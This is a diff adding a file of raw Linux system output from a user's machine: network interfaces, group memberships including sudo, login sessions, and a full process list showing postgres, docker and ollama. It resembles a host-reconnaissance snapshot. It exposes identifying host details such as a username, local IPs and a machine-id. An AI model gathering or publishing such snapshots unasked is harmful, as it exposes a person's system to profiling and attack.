@@ -1,0 +1,489 @@
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+3: wlan0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
+    inet 192.168.1.171/24 brd 192.168.1.255 scope global dynamic noprefixroute wlan0
+       valid_lft 2229sec preferred_lft 2229sec
+4: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
+    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
+       valid_lft forever preferred_lft forever
+5: vboxnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    inet 192.168.56.1/24 brd 192.168.56.255 scope global vboxnet0
+       valid_lft forever preferred_lft forever
+uid=1000(derek) gid=1000(derek) groups=1000(derek),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),102(scanner),114(wireshark),119(kaboxer),967(vboxusers),979(bluetooth),981(ollama),999(lpadmin)
+ 22:48:47 up 3 days, 10:26,  1 user,  load average: 1.09, 1.15, 1.20
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU  WHAT
+derek    tty1     -                Sat12    3days  4:44m   ?    xinit /etc/X11/xinit/xinitrc -- /etc/X11/xinit/xserverrc :1 vt1 -keeptty -auth /tmp/serverauth.uChHUriUmZ
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root           1  0.1  0.0  27640 16604 ?        Ss   Sep26   7:35 /sbin/init splash
+root           2  0.0  0.0      0     0 ?        S    Sep26   0:00 [kthreadd]
+root           3  0.0  0.0      0     0 ?        S    Sep26   0:00 [pool_workqueue_release]
+root           4  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-rcu_gp]
+root           5  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-sync_wq]
+root           6  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-kvfree_rcu_reclaim]
+root           7  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-slub_flushwq]
+root           8  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-netns]
+root          10  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/0:0H-kblockd]
+root          12  0.0  0.0      0     0 ?        I    Sep26   0:00 [kworker/u64:0-nfq_workqueue]
+root          13  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-mm_percpu_wq]
+root          14  0.0  0.0      0     0 ?        S    Sep26   0:01 [ksoftirqd/0]
+root          15  0.0  0.0      0     0 ?        I    Sep26   0:50 [rcu_preempt]
+root          16  0.0  0.0      0     0 ?        S    Sep26   0:00 [rcu_exp_par_gp_kthread_worker/0]
+root          17  0.0  0.0      0     0 ?        S    Sep26   0:00 [rcu_exp_gp_kthread_worker]
+root          18  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/0]
+root          19  0.0  0.0      0     0 ?        S    Sep26   0:00 [kprobe-optimizer]
+root          20  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/0]
+root          21  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/0]
+root          22  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/1]
+root          23  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/1]
+root          24  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/1]
+root          25  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/1]
+root          27  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/1:0H-kblockd]
+root          28  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/2]
+root          29  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/2]
+root          30  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/2]
+root          31  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/2]
+root          33  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/2:0H-kblockd]
+root          34  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/3]
+root          35  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/3]
+root          36  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/3]
+root          37  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/3]
+root          39  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/3:0H-kblockd]
+root          40  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/4]
+root          41  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/4]
+root          42  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/4]
+root          43  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/4]
+root          45  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/4:0H-kblockd]
+root          46  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/5]
+root          47  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/5]
+root          48  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/5]
+root          49  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/5]
+root          51  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/5:0H-kblockd]
+root          52  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/6]
+root          53  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/6]
+root          54  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/6]
+root          55  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/6]
+root          57  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/6:0H-kblockd]
+root          58  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/7]
+root          59  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/7]
+root          60  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/7]
+root          61  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/7]
+root          63  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/7:0H-kblockd]
+root          64  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/8]
+root          65  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/8]
+root          66  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/8]
+root          67  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/8]
+root          69  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/8:0H-kblockd]
+root          70  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/9]
+root          71  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/9]
+root          72  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/9]
+root          73  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/9]
+root          75  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/9:0H-kblockd]
+root          76  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/10]
+root          77  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/10]
+root          78  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/10]
+root          79  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/10]
+root          81  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/10:0H-kblockd]
+root          82  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/11]
+root          83  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/11]
+root          84  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/11]
+root          85  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/11]
+root          87  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/11:0H-kblockd]
+root          88  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/12]
+root          89  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/12]
+root          90  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/12]
+root          91  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/12]
+root          93  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/12:0H-kblockd]
+root          94  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/13]
+root          95  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/13]
+root          96  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/13]
+root          97  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/13]
+root          99  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/13:0H-kblockd]
+root         100  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/14]
+root         101  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/14]
+root         102  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/14]
+root         103  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/14]
+root         105  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/14:0H-kblockd]
+root         106  0.0  0.0      0     0 ?        S    Sep26   0:00 [cpuhp/15]
+root         107  0.0  0.0      0     0 ?        S    Sep26   0:00 [idle_inject/15]
+root         108  0.0  0.0      0     0 ?        S    Sep26   0:00 [migration/15]
+root         109  0.0  0.0      0     0 ?        S    Sep26   0:00 [ksoftirqd/15]
+root         111  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/15:0H-kblockd]
+root         130  0.0  0.0      0     0 ?        S    Sep26   0:00 [kdevtmpfs]
+root         131  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-inet_frag_wq]
+root         132  0.0  0.0      0     0 ?        I    Sep26   0:00 [rcu_tasks_kthread]
+root         133  0.0  0.0      0     0 ?        I    Sep26   0:00 [rcu_tasks_rude_kthread]
+root         134  0.0  0.0      0     0 ?        S    Sep26   0:00 [kauditd]
+root         135  0.0  0.0      0     0 ?        S    Sep26   0:00 [khungtaskd]
+root         137  0.0  0.0      0     0 ?        S    Sep26   0:00 [oom_reaper]
+root         139  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-writeback]
+root         140  0.0  0.0      0     0 ?        S    Sep26   0:04 [kcompactd0]
+root         141  0.0  0.0      0     0 ?        SN   Sep26   0:00 [ksmd]
+root         142  0.0  0.0      0     0 ?        SN   Sep26   0:06 [khugepaged]
+root         143  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-kblockd]
+root         144  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-blkcg_punt_bio]
+root         145  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-kintegrityd]
+root         146  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/9-acpi]
+root         149  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-tpm_dev_wq]
+root         150  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-edac-poller]
+root         151  0.0  0.0      0     0 ?        I    Sep26   0:00 [kworker/u64:1]
+root         152  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-devfreq_wq]
+root         153  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-quota_events_unbound]
+root         155  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/26-AMD-Vi0-Evt]
+root         156  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/27-AMD-Vi0-PPR]
+root         157  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/28-AMD-Vi0-GA]
+root         158  0.0  0.0      0     0 ?        S    Sep26   0:00 [kswapd0]
+root         159  0.0  0.0      0     0 ?        I    Sep26   0:10 [kdamond.0]
+root         163  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-kthrotld]
+root         164  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/u67:0-hci0]
+root         165  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/32-aerdrv]
+root         166  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/33-aerdrv]
+root         167  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/34-aerdrv]
+root         168  0.0  0.0      0     0 ?        S    Sep26   0:00 [irq/35-aerdrv]
+root         169  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-acpi_thermal_pm]
+root         171  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-mld]
+root         172  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-ipv6_addrconf]
+root         173  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-kstrp]
+root         180  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/u68:0]
+root         350  0.0  0.0      0     0 ?        S    Sep26   0:00 [watchdogd]
+root         353  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-nvme-wq]
+root         354  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-nvme-reset-wq]
+root         355  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-nvme-delete-wq]
+root         356  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-nvme-auth-wq]
+root         357  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-ata_sff]
+root         360  0.0  0.0      0     0 ?        S    Sep26   0:00 [scsi_eh_0]
+root         361  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-scsi_tmf_0]
+root         362  0.0  0.0      0     0 ?        S    Sep26   0:00 [scsi_eh_1]
+root         363  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-scsi_tmf_1]
+root         364  0.0  0.0      0     0 ?        S    Sep26   0:00 [scsi_eh_2]
+root         365  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-scsi_tmf_2]
+root         367  0.0  0.0      0     0 ?        S    Sep26   0:00 [scsi_eh_3]
+root         368  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-scsi_tmf_3]
+root         378  0.0  0.0      0     0 ?        S    Sep26   0:00 [scsi_eh_4]
+root         379  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-scsi_tmf_4]
+root         380  0.0  0.0      0     0 ?        S    Sep26   0:03 [usb-storage]
+root         381  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-uas]
+root         419  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/3:1H-kblockd]
+root         420  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/15:1H-kblockd]
+root         421  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/4:1H-kblockd]
+root         422  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/11:1H-kblockd]
+root         423  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/5:1H-kblockd]
+root         441  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/8:1H-kblockd]
+root         446  0.0  0.0      0     0 ?        S    Sep26   0:09 [jbd2/nvme0n1p2-8]
+root         447  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-ext4-rsv-conversion]
+root         494  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/12:1H-kblockd]
+root         496  0.0  0.0      0     0 ?        S    Sep26   0:05 [psimon]
+root         507  0.0  0.4 200940 145972 ?       Ss   Sep26   1:53 /usr/lib/systemd/systemd-journald
+systemd+     527  0.0  0.0  83420  6328 ?        Ssl  Sep26   0:00 /usr/lib/systemd/systemd-timesyncd
+root         529  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/9:1H-kblockd]
+root         530  0.0  0.0   9372  4888 ?        Ss   Sep26   0:00 /usr/lib/systemd/systemd-userdbd
+root         531  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/0:1H-kblockd]
+root         532  0.0  0.0  42808 14772 ?        Ss   Sep26   0:00 /usr/lib/systemd/systemd-udevd
+root         550  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/7:1H-kblockd]
+root         553  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/6:1H-kblockd]
+root         565  0.0  0.0      0     0 ?        S    Sep26   0:00 [psimon]
+root         568  0.0  0.0      0     0 ?        S    Sep26   0:00 [psimon]
+root         654  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/14:1H-kblockd]
+root         826  0.0  0.0      0     0 ?        S    Sep26   0:00 [nv_queue]
+root         827  0.0  0.0      0     0 ?        S    Sep26   0:00 [nv_queue]
+root         828  0.0  0.0      0     0 ?        S    Sep26   0:00 [nv_open_q]
+root         844  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-led_workqueue]
+root         928  0.0  0.0   8392  5004 ?        Ss   Sep26   0:02 /usr/sbin/haveged --Foreground --verbose=1
+root         929  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-cfg80211]
+root        1143  0.0  0.0      0     0 ?        S    Sep26   0:29 [irq/95-iwlwifi]
+root        1190  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/2:1H-kblockd]
+root        1191  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-rpciod]
+root        1192  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-xprtiod]
+root        1335  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/u67:1-hci0]
+root        1344  0.0  0.0      0     0 ?        S    Sep26   0:14 [nvidia-modeset/kthread_q]
+root        1345  0.0  0.0      0     0 ?        S    Sep26   0:00 [nvidia-modeset/deferred_close_kthread_q]
+root        1357  0.0  0.0 309276  7568 ?        Ssl  Sep26   0:00 /usr/libexec/accounts-daemon
+root        1362  0.0  0.0  12940  6884 ?        Ss   Sep26   0:00 /usr/libexec/bluetooth/bluetoothd
+root        1366  0.0  0.0   6900  2964 ?        Ss   Sep26   0:00 /usr/sbin/cron -f
+message+    1369  0.0  0.0  10492  7096 ?        Ss   Sep26   2:57 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+polkitd     1382  0.0  0.0 383140 10836 ?        Ssl  Sep26   0:03 /usr/lib/polkit-1/polkitd --no-debug --log-level=notice
+root        1385  0.0  0.0  10684  6368 ?        Ss   Sep26   0:00 /usr/sbin/smartd -n
+root        1395  0.0  0.0  11888  8196 ?        Ss   Sep26   0:37 /usr/lib/systemd/systemd-logind
+root        1498  0.0  0.0 337032 20232 ?        Ssl  Sep26   0:15 /usr/sbin/NetworkManager --no-daemon
+root        1562  0.0  0.0 317840 13080 ?        Ssl  Sep26   0:00 /usr/sbin/ModemManager
+root        1627  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/R-iprt-VBoxWQueue]
+root        1628  0.0  0.0      0     0 ?        S    Sep26   0:00 [iprt-VBoxTscThread]
+root        1642  0.0  0.0  18804 12608 ?        Ss   Sep26   0:03 /usr/sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev
+root        1671  0.0  0.0 382352  7956 ?        Ssl  Sep26   0:00 /usr/sbin/lightdm
+root        1674  0.0  0.1 2485580 48140 ?       Ssl  Sep26   2:10 /usr/bin/containerd
+root        1701  0.0  0.0  24900 10556 tty7     Ss+  Sep26   0:00 /usr/lib/xorg/Xorg :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch
+root        1703  0.0  0.0   8208  5060 ?        Ss   Sep26   0:00 login -- derek
+postgres    1707  0.0  0.0 226940 32444 ?        Ss   Sep26   0:02 /usr/lib/postgresql/18/bin/postgres -D /var/lib/postgresql/18/main -c config_file=/etc/postgresql/18/main/postgresql.conf
+postgres    1720  0.0  0.0 226928  7556 ?        Ss   Sep26   0:00 postgres: 18/main: io worker 0
+postgres    1721  0.0  0.0 226928  6864 ?        Ss   Sep26   0:00 postgres: 18/main: io worker 1
+postgres    1722  0.0  0.0 226928  6232 ?        Ss   Sep26   0:00 postgres: 18/main: io worker 2
+postgres    1723  0.0  0.0 227048  8752 ?        Ss   Sep26   0:00 postgres: 18/main: checkpointer 
+postgres    1724  0.0  0.0 227068  7616 ?        Ss   Sep26   0:01 postgres: 18/main: background writer 
+postgres    1745  0.0  0.0 226928 10636 ?        Ss   Sep26   0:01 postgres: 18/main: walwriter 
+postgres    1746  0.0  0.0 228488  9228 ?        Ss   Sep26   0:00 postgres: 18/main: autovacuum launcher 
+postgres    1747  0.0  0.0 228488  8444 ?        Ss   Sep26   0:00 postgres: 18/main: logical replication launcher 
+root        1819  0.0  0.2 2766064 81116 ?       Ssl  Sep26   0:18 /usr/sbin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+ollama      1820  0.0  0.1 2412552 43256 ?       Ssl  Sep26   0:07 /usr/local/bin/ollama serve
+root        1870  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/13:1H-kblockd]
+root        1871  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/10:1H-kblockd]
+root        2110  0.0  0.0      0     0 ?        S    Sep26   0:00 [UVM global queue]
+root        2111  0.0  0.0      0     0 ?        S    Sep26   0:00 [UVM deferred release queue]
+root        2112  0.0  0.0      0     0 ?        S    Sep26   0:00 [UVM Tools Event Queue]
+root        2137  0.0  0.0      0     0 ?        I<   Sep26   0:00 [kworker/1:1H-kblockd]
+derek       2205  0.0  0.0  19152 12956 ?        Ss   Sep26   0:00 /usr/lib/systemd/systemd --user
+derek       2223  0.0  0.0  16624  3464 ?        S    Sep26   0:00 (sd-pam)
+derek       2236  0.0  0.0   9040  4364 ?        Ss   Sep26   0:00 /usr/bin/dbus-broker-launch --scope user
+derek       2239  0.0  0.0   6444  4220 ?        S    Sep26   0:00 dbus-broker --log 11 --controller 10 --machine-id d349b4282c5f4bed85aa5274fef5b24d --max-bytes 100000000000000 --max-fds 25000000000000 --max-matches 5000000000
+derek       2246  0.0  0.0   7424  3932 ?        Ss   Sep26   0:00 /usr/bin/mpris-proxy
+derek       2247  0.2  0.0 116524 22232 ?        S<sl Sep26  10:00 /usr/bin/pipewire
+derek       2248  0.0  0.1 610848 36892 ?        S<sl Sep26   0:01 /usr/bin/wireplumber
+derek       2249  0.0  0.0  84892  5548 ?        Ssl  Sep26   0:00 /usr/bin/pipewire -c filter-chain.conf
+derek       2250  0.4  0.0 193312 31048 ?        S<Lsl Sep26  23:42 /usr/bin/pipewire-pulse
+derek       2262  0.0  0.0  10768  6920 tty1     Ss   Sep26   0:00 -zsh
+rtkit       2263  0.0  0.0  21716  3496 ?        SNsl Sep26   0:01 /usr/libexec/rtkit-daemon
+root        2304  0.0  0.0      0     0 ?        S<   Sep26   0:00 [krfcommd]
+derek       2344  0.0  0.0   2692  1896 tty1     S+   Sep26   0:00 /bin/sh /usr/bin/startx
+derek       2362  0.0  0.0   4120  2492 tty1     S+   Sep26   0:00 xinit /etc/X11/xinit/xinitrc -- /etc/X11/xinit/xserverrc :1 vt1 -keeptty -auth /tmp/serverauth.uChHUriUmZ
+root        2363  0.1  0.7 25613320 234456 tty1  Sl   Sep26   9:16 /usr/lib/xorg/Xorg -nolisten tcp :1 vt1 -keeptty -auth /tmp/serverauth.uChHUriUmZ
+root        2371  0.0  0.0      0     0 ?        S    Sep26   1:08 [irq/96-nvidia]
+root        2372  0.0  0.0      0     0 ?        S    Sep26   0:00 [nvidia]
+root        2373  0.0  0.0      0     0 ?        S    Sep26   0:11 [nv_queue]
+derek       2400  0.0  0.2 1855040 74272 tty1    Sl   Sep26   0:06 xfce4-session
+derek       2448  0.0  0.0  10672  1924 ?        Ss   Sep26   0:00 /usr/bin/ssh-agent x-session-manager
+derek       2461  0.0  0.0 381480  8136 ?        Ssl  Sep26   0:00 /usr/libexec/at-spi-bus-launcher
+derek       2467  0.0  0.0   9040  4144 ?        S    Sep26   0:00 /usr/bin/dbus-broker-launch --config-file=/usr/share/defaults/at-spi2/accessibility.conf --scope user
+derek       2468  0.0  0.0   5524  3516 ?        S    Sep26   0:06 dbus-broker --log 10 --controller 9 --machine-id d349b4282c5f4bed85aa5274fef5b24d --max-bytes 100000000000000 --max-fds 6400000 --max-matches 5000000000
+derek       2478  0.0  0.0 169220  8276 ?        Ssl  Sep26   0:09 /usr/libexec/at-spi2-registryd --use-gnome-session
+derek       2491  0.0  0.0 155560  3848 ?        SLsl Sep26   0:01 /usr/bin/gpg-agent --supervised
+derek       2494  0.1  0.2 1897088 95852 tty1    Sl   Sep26   7:19 xfwm4
+derek       2499  0.0  0.0 314408  8704 ?        Ssl  Sep26   0:00 /usr/libexec/gvfsd
+derek       2505  0.0  0.0 326144  8048 ?        Sl   Sep26   0:00 /usr/libexec/gvfsd-fuse /run/user/1000/gvfs -f
+derek       2528  0.0  0.0 352876 28860 tty1     Sl   Sep26   0:02 xfsettingsd
+derek       2534  0.0  0.0 166768  6688 ?        Ssl  Sep26   0:00 /usr/libexec/dconf-service
+derek       2538  0.0  0.2 1948700 87508 tty1    Sl   Sep26   0:16 xfce4-panel
+derek       2544  0.0  0.0 416608 27464 tty1     Sl   Sep26   0:00 Thunar --daemon
+derek       2550  0.0  0.2 1982452 65984 tty1    Sl   Sep26   0:06 xfdesktop
+derek       2555  0.0  0.1 1966788 45144 tty1    Sl   Sep26   0:03 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libwhiskermenu.so 1 14680071 whiskermenu Whisker Menu Show a menu to easily access installed applications
+derek       2612  0.0  0.0 170556  7764 ?        Ssl  Sep26   0:00 /usr/libexec/gvfsd-metadata
+derek       2636  0.1  0.4 401884 151900 tty1    Sl   Sep26   6:28 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libcpugraph.so 13 14680076 cpugraph CPU Graph Graphical representation of the CPU load
+derek       2637  0.0  0.1 1897132 38452 tty1    Sl   Sep26   0:01 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libsystray.so 14 14680077 systray Status Tray Plugin Provides status notifier items (application indicators) and legacy systray items
+derek       2638  0.1  0.0 277276 30268 tty1     Sl   Sep26   8:06 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libgenmon.so 15 14680078 genmon Generic Monitor Show output of a command.
+derek       2639  0.0  0.1 1783996 49852 tty1    Sl   Sep26   0:02 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libpulseaudio-plugin.so 16 14680079 pulseaudio PulseAudio Plugin Adjust the audio volume of the PulseAudio sound system
+derek       2640  0.0  0.1 1831012 37700 tty1    Sl   Sep26   0:01 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libnotification-plugin.so 17 14680080 notification-plugin Notification Plugin Notification plugin for the Xfce panel
+derek       2641  0.0  0.1 1765636 37784 tty1    Sl   Sep26   0:09 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libxfce4powermanager.so 18 14680081 power-manager-plugin Power Manager Plugin Display the battery levels of your devices and control the brightness of your display
+derek       2646  0.0  0.1 1831288 37624 tty1    Sl   Sep26   0:00 /usr/lib/x86_64-linux-gnu/xfce4/panel/wrapper-2.0 /usr/lib/x86_64-linux-gnu/xfce4/panel/plugins/libactions.so 22 14680082 actions Action Buttons Log out, lock or other system actions
+root        2748  0.0  0.0 321164 13064 ?        Ssl  Sep26   0:12 /usr/libexec/upowerd
+derek       2887  0.0  0.1 1779112 39740 ?       Ssl  Sep26   0:01 /usr/lib/x86_64-linux-gnu/xfce4/notifyd/xfce4-notifyd
+derek       3227  0.0  0.1 624516 40996 tty1     Sl   Sep26   0:02 xfce4-screensaver
+derek       3229  0.0  0.0 315996  8672 tty1     Sl   Sep26   0:00 /usr/libexec/geoclue-2.0/demos/agent
+derek       3234  0.0  0.1 684824 64176 tty1     Sl   Sep26   0:01 /usr/bin/python3 /usr/bin/blueman-applet
+derek       3241  0.0  0.1  71920 43344 tty1     S    Sep26   0:00 /usr/bin/python3 /usr/share/system-config-printer/applet.py
+derek       3258  0.0  0.0 269928 19780 tty1     Sl   Sep26   0:00 /usr/libexec/polkit-mate-authentication-agent-1
+derek       3266  0.0  0.1 2116044 44440 tty1    Sl   Sep26   0:08 nm-applet
+derek       3267  0.0  0.0 415420 27188 tty1     Sl   Sep26   0:03 xfce4-power-manager
+derek       3274  0.0  0.0 858608  9784 tty1     Sl   Sep26   0:00 xiccd
+colord      3306  0.0  0.0 317576 16144 ?        Ssl  Sep26   0:00 /usr/libexec/colord
+derek       3307  0.0  0.0  12576  2452 ?        Ssl  Sep26   0:01 xcape -e Super_L Control_L Escape
+root        3339  0.0  0.1 421360 35948 ?        Ssl  Sep26   0:00 /usr/bin/python3 /usr/sbin/tlp-pd
+derek       3481  0.0  0.0 390996 11436 ?        Ssl  Sep26   0:00 /usr/libexec/gvfs-udisks2-volume-monitor
+root        3535  0.0  0.0 479204 15624 ?        Ssl  Sep26   0:20 /usr/libexec/udisks2/udisksd
+derek       3567  0.0  0.0 309708  7912 ?        Ssl  Sep26   0:00 /usr/libexec/gvfs-mtp-volume-monitor
+derek       3570  0.0  0.0 381488 19784 ?        Ssl  Sep26   0:00 /usr/libexec/bluetooth/obexd
